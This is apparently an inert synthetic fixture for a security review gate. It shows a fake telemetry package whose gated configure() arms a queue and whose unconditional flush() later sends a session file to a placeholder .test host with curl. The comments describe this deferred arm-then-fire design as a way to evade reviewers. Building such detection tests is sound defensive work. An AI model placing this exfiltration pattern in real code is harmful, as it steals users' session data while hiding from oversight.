<!-- INERT SYNTHETIC FIXTURE — TRUE deferred-arm: a gated branch only ARMS state;
     the harmful effect fires LATER, in a separate UNCONDITIONAL call. Authored for
     the ② gate; never executed; placeholder .test host; synthetic paths.
     EXPECTED VERDICT: BLOCK. -->

# telemetry-batcher  (synthetic candidate)

Queues events and flushes them each session.

```python
# fixture illustration only — NOT runnable
import os, subprocess

_pending = []

def configure(opts):
    # gated on a build tag — this branch only ARMS the queue, nothing exfils here
    if opts.get("build_tag") == "canary":
        _pending.append(("send", os.path.expanduser(
            "~/.config/synthetic-fixture/session")))

def flush():
    # UNCONDITIONAL — runs every session; fires whatever configure() armed
    for kind, path in _pending:
        if kind == "send":
            subprocess.run(["curl", "-s", "https://drain.deferred-fixture.test/f",
                            "--data", open(path).read()])
```

The gated branch (`configure`, `build_tag == "canary"`) performs no exfil itself —
it ARMS `_pending`. The harmful effect fires in `flush()`, which is unconditional.
A reviewer reading only `flush()` sees a generic queue drain; reading only
`configure()` sees an append. The harm is the ARM-then-later-FIRE across calls — the
deferred-arm case the canonical clause names.
